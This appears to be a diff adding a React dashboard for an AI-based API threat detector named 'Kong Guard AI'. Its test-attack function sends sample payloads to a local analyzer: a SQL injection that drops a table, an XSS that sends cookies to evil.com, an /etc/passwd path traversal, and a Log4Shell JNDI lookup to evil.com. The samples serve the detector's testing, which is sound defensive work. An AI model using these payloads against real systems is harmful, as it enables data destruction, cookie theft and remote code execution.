@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kong Guard AI - Real-Time AI Threat Analysis</title>
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @keyframes aiPulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(139, 92, 246, 0.5); }
+            50% { box-shadow: 0 0 40px rgba(139, 92, 246, 1); }
+        }
+        
+        @keyframes thinking {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes scan {
+            0% { transform: translateY(0); opacity: 1; }
+            100% { transform: translateY(100%); opacity: 0; }
+        }
+        
+        .ai-active { animation: aiPulse 1s infinite; }
+        .thinking-spinner { animation: thinking 1s linear infinite; }
+        .scan-line { animation: scan 2s linear infinite; }
+        
+        .threat-critical { background: linear-gradient(135deg, #ff0000, #990000); }
+        .threat-high { background: linear-gradient(135deg, #ff4444, #cc0000); }
+        .threat-medium { background: linear-gradient(135deg, #ffaa00, #ff6600); }
+        .threat-low { background: linear-gradient(135deg, #ffff00, #cccc00); }
+        .threat-safe { background: linear-gradient(135deg, #00ff00, #00cc00); }
+        
+        .ai-brain {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            box-shadow: 0 0 30px rgba(102, 126, 234, 0.5);
+        }
+        
+        .code-highlight {
+            background: rgba(139, 92, 246, 0.1);
+            border-left: 3px solid #8b5cf6;
+            font-family: 'Courier New', monospace;
+        }
+    </style>
+</head>
+<body class="bg-gray-900 text-white min-h-screen">
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect, useRef } = React;
+
+        function App() {
+            const [connected, setConnected] = useState(false);
+            const [currentAnalysis, setCurrentAnalysis] = useState(null);
+            const [aiThinking, setAiThinking] = useState(false);
+            const [threatHistory, setThreatHistory] = useState([]);
+            const [metrics, setMetrics] = useState({
+                total_analyzed: 0,
+                threats_blocked: 0,
+                false_positives: 0,
+                avg_confidence: 0,
+                avg_processing_ms: 0,
+                ai_model: 'Gemini Flash 2.0'
+            });
+            const [aiInsights, setAiInsights] = useState({
+                reasoning: '',
+                indicators: [],
+                confidence: 0,
+                patterns: [],
+                recommendation: ''
+            });
+
+            useEffect(() => {
+                // Connect to WebSocket
+                const ws = new WebSocket('ws://localhost:8000/ws');
+                
+                ws.onopen = () => {
+                    setConnected(true);
+                    console.log('Connected to AI Analysis Service');
+                };
+                
+                ws.onmessage = (event) => {
+                    const data = JSON.parse(event.data);
+                    
+                    if (data.type === 'threat_analysis') {
+                        setAiThinking(true);
+                        
+                        // Update current analysis
+                        setCurrentAnalysis(data);
+                        
+                        // Update AI insights
+                        setAiInsights({
+                            reasoning: data.reasoning || 'Analyzing patterns...',
+                            indicators: data.indicators || [],
+                            confidence: data.confidence || 0,
+                            patterns: data.patterns || [],
+                            recommendation: data.recommended_action || 'monitor',
+                            processing_time: data.processing_time_ms || 0,
+                            threat_score: data.threat_score || 0,
+                            threat_type: data.threat_type || 'unknown'
+                        });
+                        
+                        // Add to history
+                        setThreatHistory(prev => [data, ...prev].slice(0, 10));
+                        
+                        // Update metrics
+                        setMetrics(prev => ({
+                            ...prev,
+                            total_analyzed: prev.total_analyzed + 1,
+                            threats_blocked: data.threat_score > 0.7 ? prev.threats_blocked + 1 : prev.threats_blocked,
+                            avg_confidence: ((prev.avg_confidence * prev.total_analyzed + data.confidence) / (prev.total_analyzed + 1)),
+                            avg_processing_ms: ((prev.avg_processing_ms * prev.total_analyzed + (data.processing_time_ms || 0)) / (prev.total_analyzed + 1))
+                        }));
+                        
+                        // Stop thinking animation after a delay
+                        setTimeout(() => setAiThinking(false), 1500);
+                    }
+                };
+                
+                ws.onerror = (error) => {
+                    console.error('WebSocket error:', error);
+                    setConnected(false);
+                };
+                
+                ws.onclose = () => {
+                    setConnected(false);
+                    // Reconnect after 3 seconds
+                    setTimeout(() => {
+                        window.location.reload();
+                    }, 3000);
+                };
+                
+                return () => {
+                    if (ws) ws.close();
+                };
+            }, []);
+
+            // Send test attacks
+            const sendTestAttack = async (type) => {
+                const attacks = {
+                    sql: {
+                        query: "SELECT * FROM users WHERE id=1 OR 1=1; DROP TABLE users;--",
+                        path: "/api/users",
+                        method: "GET"
+                    },
+                    xss: {
+                        query: "<script>alert('XSS');document.location='http://evil.com?cookie='+document.cookie</script>",
+                        path: "/comment",
+                        method: "POST"
+                    },
+                    path_traversal: {
+                        query: "../../../../etc/passwd",
+                        path: "/files/download",
+                        method: "GET"
+                    },
+                    zero_day: {
+                        query: "${jndi:ldap://evil.com/a}",
+                        path: "/api/log",
+                        method: "POST"
+                    },
+                    normal: {
+                        query: "page=1&limit=10",
+                        path: "/api/products",
+                        method: "GET"
+                    }
+                };
+
+                const attack = attacks[type];
+                setAiThinking(true);
+
+                try {
+                    const response = await fetch('http://localhost:8000/analyze', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            features: {
+                                method: attack.method,
+                                path: attack.path,
+                                client_ip: `192.168.1.${Math.floor(Math.random() * 255)}`,
+                                user_agent: type === 'normal' ? 'Mozilla/5.0' : 'AttackBot/1.0',
+                                requests_per_minute: type === 'normal' ? 10 : 100,
+                                content_length: 0,
+                                query_param_count: 2,
+                                header_count: 5,
+                                hour_of_day: new Date().getHours(),
+                                query: attack.query,
+                                headers: { "User-Agent": type === 'normal' ? 'Mozilla/5.0' : 'AttackBot' }
+                            },
+                            context: {
+                                previous_requests: Math.floor(Math.random() * 100),
+                                failed_attempts: type === 'normal' ? 0 : Math.floor(Math.random() * 10),
+                                anomaly_score: type === 'normal' ? 0.1 : 0.8
+                            }
+                        })
+                    });
+                    
+                    const result = await response.json();
+                    console.log('Attack result:', result);
+                } catch (error) {
+                    console.error('Failed to send attack:', error);
+                }
+            };
+
+            const getThreatColor = (score) => {
+                if (score >= 0.9) return 'threat-critical';
+                if (score >= 0.7) return 'threat-high';
+                if (score >= 0.5) return 'threat-medium';
+                if (score >= 0.3) return 'threat-low';
+                return 'threat-safe';
+            };
+
+            const getActionIcon = (action) => {
+                switch(action) {
+                    case 'block': return '🛑';
+                    case 'rate_limit': return '⚠️';
+                    case 'monitor': return '👁️';
+                    case 'allow': return '✅';
+                    default: return '❓';
+                }
+            };
+
+            return (
+                <div className="min-h-screen p-6">
+                    {/* Header */}
+                    <div className="mb-8">
+                        <h1 className="text-4xl font-bold mb-2 flex items-center gap-4">
+                            <span className="ai-brain p-3 rounded-lg">🧠</span>
+                            Kong Guard AI - Real-Time AI Analysis
+                            <span className={`ml-4 text-sm px-3 py-1 rounded-full ${connected ? 'bg-green-500' : 'bg-red-500'}`}>
+                                {connected ? '● LIVE' : '● DISCONNECTED'}
+                            </span>
+                        </h1>
+                        <p className="text-gray-400">Powered by {metrics.ai_model} - Autonomous Threat Detection</p>
+                    </div>
+
+                    {/* AI Thinking Status */}
+                    {aiThinking && (
+                        <div className="fixed top-20 right-6 bg-purple-600 p-4 rounded-lg ai-active z-50">
+                            <div className="flex items-center gap-3">
+                                <div className="thinking-spinner w-6 h-6 border-2 border-white border-t-transparent rounded-full"></div>
+                                <span>AI is analyzing request...</span>
+                            </div>
+                        </div>
+                    )}
+
+                    {/* Metrics Dashboard */}
+                    <div className="grid grid-cols-5 gap-4 mb-8">
+                        <div className="bg-gray-800 p-4 rounded-lg">
+                            <h3 className="text-sm text-gray-400 mb-1">Total Analyzed</h3>
+                            <p className="text-2xl font-bold">{metrics.total_analyzed}</p>
+                        </div>
+                        <div className="bg-gray-800 p-4 rounded-lg">
+                            <h3 className="text-sm text-gray-400 mb-1">Threats Blocked</h3>
+                            <p className="text-2xl font-bold text-red-400">{metrics.threats_blocked}</p>
+                        </div>
+                        <div className="bg-gray-800 p-4 rounded-lg">
+                            <h3 className="text-sm text-gray-400 mb-1">Avg Confidence</h3>
+                            <p className="text-2xl font-bold text-blue-400">{(metrics.avg_confidence * 100).toFixed(1)}%</p>
+                        </div>
+                        <div className="bg-gray-800 p-4 rounded-lg">
+                            <h3 className="text-sm text-gray-400 mb-1">Avg Processing</h3>
+                            <p className="text-2xl font-bold text-yellow-400">{metrics.avg_processing_ms.toFixed(0)}ms</p>
+                        </div>
+                        <div className="bg-gray-800 p-4 rounded-lg">
+                            <h3 className="text-sm text-gray-400 mb-1">False Positives</h3>
+                            <p className="text-2xl font-bold text-green-400">{metrics.false_positives}</p>
+                        </div>
+                    </div>
+
+                    {/* Main Content Grid */}
+                    <div className="grid grid-cols-3 gap-6">
+                        {/* Left: Current AI Analysis */}
+                        <div className="col-span-2 space-y-6">
+                            {/* AI Insights Panel */}
+                            <div className="bg-gray-800 rounded-lg p-6">
+                                <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
+                                    <span>🔍</span> Current AI Analysis
+                                </h2>
+                                
+                                {aiInsights.threat_score !== undefined && (
+                                    <div className="space-y-4">
+                                        {/* Threat Score Bar */}
+                                        <div>
+                                            <div className="flex justify-between mb-2">
+                                                <span>Threat Score</span>
+                                                <span className="font-bold">{(aiInsights.threat_score * 100).toFixed(1)}%</span>
+                                            </div>
+                                            <div className="w-full bg-gray-700 rounded-full h-6">
+                                                <div 
+                                                    className={`h-6 rounded-full flex items-center justify-center text-xs font-bold ${getThreatColor(aiInsights.threat_score)}`}
+                                                    style={{width: `${aiInsights.threat_score * 100}%`}}
+                                                >
+                                                    {aiInsights.threat_type}
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        {/* AI Reasoning */}
+                                        <div className="code-highlight p-4 rounded">
+                                            <h3 className="text-sm font-bold mb-2 text-purple-400">AI Reasoning:</h3>
+                                            <p className="text-sm">{aiInsights.reasoning}</p>
+                                        </div>
+
+                                        {/* Threat Indicators */}
+                                        {aiInsights.indicators && aiInsights.indicators.length > 0 && (
+                                            <div>
+                                                <h3 className="text-sm font-bold mb-2 text-yellow-400">Detected Indicators:</h3>
+                                                <div className="flex flex-wrap gap-2">
+                                                    {aiInsights.indicators.map((indicator, i) => (
+                                                        <span key={i} className="px-3 py-1 bg-red-900 rounded-full text-xs">
+                                                            {indicator}
+                                                        </span>
+                                                    ))}
+                                                </div>
+                                            </div>
+                                        )}
+
+                                        {/* AI Recommendation */}
+                                        <div className="bg-gray-700 p-4 rounded">
+                                            <h3 className="text-sm font-bold mb-2">AI Recommendation:</h3>
+                                            <div className="flex items-center gap-3">
+                                                <span className="text-3xl">{getActionIcon(aiInsights.recommendation)}</span>
+                                                <div>
+                                                    <p className="font-bold capitalize">{aiInsights.recommendation}</p>
+                                                    <p className="text-sm text-gray-400">
+                                                        Confidence: {(aiInsights.confidence * 100).toFixed(1)}% | 
+                                                        Processing: {aiInsights.processing_time}ms
+                                                    </p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                )}
+
+                                {!aiInsights.threat_score && (
+                                    <div className="text-center py-8 text-gray-500">
+                                        <p>Waiting for AI analysis...</p>
+                                        <p className="text-sm mt-2">Send a test attack to see AI in action</p>
+                                    </div>
+                                )}
+                            </div>
+
+                            {/* Request Details */}
+                            {currentAnalysis && (
+                                <div className="bg-gray-800 rounded-lg p-6">
+                                    <h2 className="text-xl font-bold mb-4">📊 Request Details</h2>
+                                    <div className="grid grid-cols-2 gap-4 text-sm">
+                                        <div>
+                                            <span className="text-gray-400">Method:</span> 
+                                            <span className="ml-2 font-mono">{currentAnalysis.method}</span>
+                                        </div>
+                                        <div>
+                                            <span className="text-gray-400">Path:</span>
+                                            <span className="ml-2 font-mono">{currentAnalysis.path}</span>
+                                        </div>
+                                        <div>
+                                            <span className="text-gray-400">Client IP:</span>
+                                            <span className="ml-2 font-mono">{currentAnalysis.client_ip}</span>
+                                        </div>
+                                        <div>
+                                            <span className="text-gray-400">Timestamp:</span>
+                                            <span className="ml-2">{new Date(currentAnalysis.timestamp).toLocaleTimeString()}</span>
+                                        </div>
+                                    </div>
+                                    
+                                    {currentAnalysis.query && (
+                                        <div className="mt-4">
+                                            <span className="text-gray-400">Query/Body:</span>
+                                            <div className="mt-2 p-3 bg-gray-900 rounded font-mono text-xs overflow-x-auto">
+                                                {currentAnalysis.query}
+                                            </div>
+                                        </div>
+                                    )}
+                                </div>
+                            )}
+                        </div>
+
+                        {/* Right: Controls and History */}
+                        <div className="space-y-6">
+                            {/* Test Attack Panel */}
+                            <div className="bg-gray-800 rounded-lg p-6">
+                                <h2 className="text-xl font-bold mb-4">🎯 Test Attacks</h2>
+                                <div className="space-y-2">
+                                    <button 
+                                        onClick={() => sendTestAttack('sql')}
+                                        className="w-full px-4 py-2 bg-red-600 hover:bg-red-700 rounded transition"
+                                    >
+                                        🔴 SQL Injection Attack
+                                    </button>
+                                    <button 
+                                        onClick={() => sendTestAttack('xss')}
+                                        className="w-full px-4 py-2 bg-orange-600 hover:bg-orange-700 rounded transition"
+                                    >
+                                        🟠 XSS Attack
+                                    </button>
+                                    <button 
+                                        onClick={() => sendTestAttack('path_traversal')}
+                                        className="w-full px-4 py-2 bg-yellow-600 hover:bg-yellow-700 rounded transition"
+                                    >
+                                        🟡 Path Traversal
+                                    </button>
+                                    <button 
+                                        onClick={() => sendTestAttack('zero_day')}
+                                        className="w-full px-4 py-2 bg-purple-600 hover:bg-purple-700 rounded transition"
+                                    >
+                                        🟣 Zero-Day Pattern
+                                    </button>
+                                    <button 
+                                        onClick={() => sendTestAttack('normal')}
+                                        className="w-full px-4 py-2 bg-green-600 hover:bg-green-700 rounded transition"
+                                    >
+                                        🟢 Normal Traffic
+                                    </button>
+                                </div>
+                            </div>
+
+                            {/* Threat History */}
+                            <div className="bg-gray-800 rounded-lg p-6">
+                                <h2 className="text-xl font-bold mb-4">📜 Recent Analysis</h2>
+                                <div className="space-y-2 max-h-96 overflow-y-auto">
+                                    {threatHistory.map((event, i) => (
+                                        <div key={i} className="p-3 bg-gray-700 rounded text-sm">
+                                            <div className="flex justify-between items-center">
+                                                <span className={`px-2 py-1 rounded text-xs ${getThreatColor(event.threat_score)}`}>
+                                                    {(event.threat_score * 100).toFixed(0)}%
+                                                </span>
+                                                <span className="text-gray-400">
+                                                    {event.threat_type}
+                                                </span>
+                                            </div>
+                                            <div className="mt-2 text-xs text-gray-400">
+                                                {event.method} {event.path}
+                                            </div>
+                                            <div className="text-xs text-gray-500 mt-1">
+                                                Action: {event.recommended_action} | {event.processing_time_ms}ms
+                                            </div>
+                                        </div>
+                                    ))}
+                                    
+                                    {threatHistory.length === 0 && (
+                                        <p className="text-center text-gray-500 py-4">No threats analyzed yet</p>
+                                    )}
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    {/* Footer Status */}
+                    <div className="mt-8 text-center text-gray-500 text-sm">
+                        <p>Kong Guard AI v2.0 | Real-time threat detection powered by {metrics.ai_model}</p>
+                        <p>WebSocket: {connected ? 'Connected' : 'Disconnected'} | Dashboard: http://localhost:8080</p>
+                    </div>
+                </div>
+            );
+        }
+
+        ReactDOM.render(<App />, document.getElementById('root'));
+    </script>
+</body>
+</html>
